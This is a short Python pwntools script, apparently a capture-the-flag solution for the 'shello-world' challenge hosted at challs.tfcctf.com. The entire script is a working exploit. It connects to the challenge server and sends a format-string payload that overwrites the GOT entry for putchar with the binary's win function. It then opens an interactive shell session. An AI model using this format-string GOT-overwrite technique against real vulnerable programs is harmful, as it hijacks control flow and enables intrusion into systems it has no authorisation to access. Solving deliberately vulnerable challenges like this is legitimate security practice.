from pwn import *

context.binary = exe = ELF('./shello-world')

io = remote('challs.tfcctf.com', 30861)

payload = fmtstr_payload(6, {exe.got['putchar']:exe.sym['win']})
io.sendline(payload)
io.interactive()